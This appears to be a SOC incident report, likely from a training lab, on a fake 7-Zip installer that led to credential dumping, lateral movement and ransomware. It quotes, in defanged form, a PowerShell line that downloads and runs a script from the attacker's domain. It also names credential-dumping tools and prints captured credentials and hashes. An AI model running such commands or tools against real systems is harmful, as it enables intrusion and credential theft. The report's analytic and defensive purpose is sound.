# üõ°Ô∏è Security Incident Report: Malicious Software Execution Leading to Credential Compromise & Ransomware Deployment

## üìå Incident Summary
**Incident Date:** September 26, 2023  
**Affected User:** Perry Parsons  
**Affected Workstation:** WKSTN-03  
**Attack Type:** Malware Infection & Ransomware Deployment  
**Root Cause:** Downloading software from a malicious website  

---
## üîç Indicators of Compromise (IOCs)

| **Indicator** | **Value** |
|--------------|-----------|
| **Malicious URL** | `http://www.7zipp.org/a/7z2301-x64[.]msi` |
| **IP Address of Malicious Domain** | `206[.]189[.]34[.]218` |
| **PID of Malicious Software Execution** | `2532` |
| **Suspicious Command Line Execution** | `powershell[.]exe iex(iwr http[:]//www[.]7zipp[.]org/a/7z[.]ps1 -useb)` |
| **Legitimate Installer Path** | `C[:]\Windows\Temp\7zlegit[.]exe` |
| **Installed Malicious Service** | `7zService` |
| **User Account Running the Service** | `SYSTEM` |
| **Credential Dumping Tool Used** | `Invoke-PowerExtract` |
| **Compromised Credential Pair** | `james[.]cromwell:852A0B8BD4E00564128E0A5EA2BC4CF` |
| **Reset Password of Another User** | `pwn3dpw!!!` |
| **Workstation Where New Account Was Used** | `WKSTN-02` |
| **Newly Discovered Credentials** | `SSF\itadmin:NoO6@39Sk0!` |
| **PowerShell Script for Hash Dumping** | `Invoke-SharpKatz[.]ps1` |
| **AES256 Hash of Domain Admin Credentials** | `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534` |
| **Total Number of Encrypted Files** | `46` |

---
## üìÖ Incident Timeline

1. **User Action:** Perry downloaded and executed a malicious `7zip` installer from `http[:]//www[.]7zipp[.]org/a/7z2301-x64[.]msi`.
2. **Malicious Payload Execution:** Process `powershell.exe iex(iwr http[:]//www[.]7zipp[.]org/a/7z[.]ps1 -useb)` executed the downloaded script.
3. **Malware Installation:** Service `7zService` was installed and executed by `SYSTEM`.
4. **Credential Dumping:** `Invoke-PowerExtract` was used to dump LSASS data.
5. **Privilege Escalation:** The attacker used `james.cromwell:852A0B8BD4E00564128E0A5EA2BC4CF` credentials to escalate access.
6. **Account Manipulation:** Password reset for `anna.jones` to `pwn3dpw!!!`.
7. **Lateral Movement:** Attacker moved from `WKSTN-03` to `WKSTN-02`.
8. **New Credentials Discovered:** `SSF\itadmin:NoO6@39Sk0!`.
9. **Domain Admin Compromise:** `Invoke-SharpKatz[.]ps1` used to extract domain admin hashes.
10. **Ransomware Deployment:** `bomb[.]exe` encrypted 46 files.

---
## ‚úÖ Recommendations

1. **Block Malicious Domains & IPs** üö´
   - Add `7zipp.org` and `206.189.34.218` to the organization's deny list.

2. **Endpoint Protection & Monitoring** üõ°Ô∏è
   - Deploy endpoint detection tools to monitor and prevent suspicious executions.
   - Implement Sysmon logging for enhanced visibility.

3. **User Awareness & Training** üéì
   - Conduct phishing and safe browsing awareness programs.
   - Educate users on verifying software sources before downloading.

4. **Credential & Access Management** üîë
   - Implement multi-factor authentication (MFA) for privileged accounts.
   - Conduct regular password audits and enforce strong password policies.

5. **Incident Response Plan Enhancement** üìú
   - Define clear response procedures for credential dumping and lateral movement.
   - Run red team simulations to test the effectiveness of security controls.

6. **Network Segmentation & Least Privilege** üîç
   - Restrict privileged account access to only necessary resources.
   - Segment critical infrastructure to prevent lateral movement.

7. **Backup & Recovery Strategy** ‚ôªÔ∏è
   - Ensure regular backups are stored offline and tested for integrity.
   - Develop an incident recovery playbook to quickly restore encrypted files.

---
## üîö Conclusion

This incident highlights the dangers of downloading software from unverified sources. The attacker leveraged a fake `7zip` installer to gain access, escalate privileges, dump credentials, and eventually deploy ransomware. The compromise of multiple user accounts emphasizes the need for robust access controls and proactive monitoring. Implementing the recommended actions will help mitigate future risks and strengthen the organization‚Äôs overall security posture.

---
**Prepared by:** jfpineda79  
**Date:** February 7, 2025  
**Security Operations Center (SOC)** üîí

